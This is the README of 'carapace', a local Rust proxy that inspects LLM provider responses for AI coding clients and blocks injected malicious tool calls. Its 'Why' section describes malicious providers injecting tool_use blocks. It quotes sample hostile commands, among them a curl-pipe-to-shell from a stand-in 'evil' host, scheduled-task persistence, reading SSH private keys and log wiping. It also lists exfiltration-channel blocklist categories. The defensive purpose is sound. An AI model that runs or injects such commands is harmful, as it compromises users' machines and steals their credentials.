# carapace

> **Local guard against malicious LLM providers — wire-level inspection proxy.**

`cape` sits between your AI client (Claude Code, Cursor, Aider, opencode, anything speaking OpenAI/Anthropic) and an upstream LLM provider. It reassembles SSE streams, inspects every `tool_use` / text chunk for prompt-injection, download-and-execute, persistence, anti-forensics and known IoCs, then blocks or logs.

Your API key is zeroized in place, never written to disk, never logged.

Rust core, crash-isolated, memory-safe.

**Status:** v0.1.0 · Apache-2.0.

---

## Why

Cheap LLM API resellers are a real malware channel. The malicious provider doesn't need RCE on your box — it just speaks Anthropic/OpenAI protocol and injects a `tool_use` block into the model response. Your client then obediently executes:

- `curl https://evil/main.ps1 | sh`
- `schtasks /create ...`
- proxy / DNS rewrites
- `cat ~/.ssh/id_rsa` over an approved tool_use
- log wiping / anti-forensics

Targets users of Claude Code, Cursor, Aider, Continue, any client that trusts `tool_use` blocks from "Claude".

`carapace` is the condom.

---

## Install

```bash
cargo install --path .
```

Or build from source:

```bash
git clone https://github.com/TaroHarado/carapace
cd carapace
cargo build --release
# binary: target/release/cape
```

---

## Quick start

### Stand up the proxy in front of Claude Code

```bash
cape proxy --upstream https://api.anthropic.com --listen 127.0.0.1:8787
```

```bash
ANTHROPIC_BASE_URL=http://127.0.0.1:8787 claude
```

Any suspicious `tool_use` from the provider is replaced with a safe stub before your client sees it. Default mode is `block`; switch to `--mode monitor` to log-only.

### Probe an unfamiliar provider before using it

```bash
cape scan --upstream https://cheap-claude-api.example
# exit 2 if risk_score >= 60

cape deep-scan --upstream https://cheap-claude-api.example \
  --claimed-model "Claude Sonnet 4.5" \
  --use-case coding-agent --format markdown --out report.md
```

### Certify a provider you trust

```bash
cape verify --upstream https://api.deepseek.com \
  --out ./certs/deepseek \
  --signing-key $(cat ~/.carapace/certify-secret.b64)
```

Writes `report.md`, `badge.svg`, signed `entry.json`, updates the local trust registry at `~/.carapace/registry.json`.

---

## Commands

```
cape <command> [options]

  proxy       Inspecting reverse proxy
  scan        One-shot tool-less probe, returns risk score
  deep-scan   Full red-team probe battery
  score       Certification-style provider score
  certify     Publish-ready bundle (report + badge + signed entry)
  verify      One-shot: scan → score → certify → add to registry
  registry    Local trust registry management
  artifact    Verify a certification bundle on disk
  session     Per-session grants + enforcement modes
  policy      Deterministic arbiter evaluation
  enforce     Unified enforcement with session context
  audit       One-shot host IoC audit
  sentinel    Background host monitor
  monitor     Continuous provider monitor with alerts
  feed        Fetch & verify signed remote threat feed
  web         SafeRouter web UI/API
  keygen      Generate Ed25519 keypair for certifications
  demo-feed   Generate a fully signed demo feed

Global flags:
  -v / -vv / -vvv    Increase verbosity
  -q                 Quiet (errors + alerts only)
```

Run `cape <command> --help` for full flag list and env vars.

---

## Detection

Out of the box `cape` ships with:
- 88 behavioural rules across 14 categories (download-exec, persistence, credential-read, anti-forensics, exfil-channels, client-config-poison, lolbin-exec, evasion-edr, git-attack, container-breakout, supply-chain, network, obfuscation, locale)
- IoC blocklist of known malicious domains (Discord/Telegram/Slack webhooks, paste services, ngrok/cloudflared tunnel endpoints)
- 30 red-team probes for `deep-scan`

Severity tiers drive the governor: Info (≤29) · Warn (30–59) · Critical (60–89) · Fatal (≥90).

Custom rules and blocklists can be supplied via `--rules` and `--blocklist`. Hot-reload is supported at the engine level — no proxy restart needed.

---

## Security

- **API keys:** zeroized in place via `Secret<T>`, never serialized, never logged.
- **Forensics store:** suspicious upstream responses are encrypted at rest with XChaCha20-Poly1305 (passphrase-derived key, passphrase never stored).
- **Local by default:** proxy listens on `127.0.0.1`. Not exposed without an explicit flag.
- **No telemetry:** `cape` never phones home. All scans happen between you and the upstream.
- **Memory safety:** Rust, no `unsafe` outside zeroize FFI. Rule compile failures are isolated — one bad regex won't down the proxy.

---

## Compatibility

- Rust 1.75+ (edition 2021)
- Windows / macOS / Linux
- Single static binary, no runtime deps
- Protocols: Anthropic Messages API, OpenAI Chat Completions (both with SSE)

---

## Contributing & internals

Architecture, module map, rule-authoring guide, red-team probe taxonomy and dev workflow are documented in [`docs/ARCHITECTURE.md`](docs/ARCHITECTURE.md).

```bash
cargo test --quiet                                # green
cargo clippy --all-targets -- -D warnings         # clean
```

---

## License

Apache-2.0. See `LICENSE` or http://www.apache.org/licenses/LICENSE-2.0.

## Author

TaroHarado · https://github.com/TaroHarado/carapace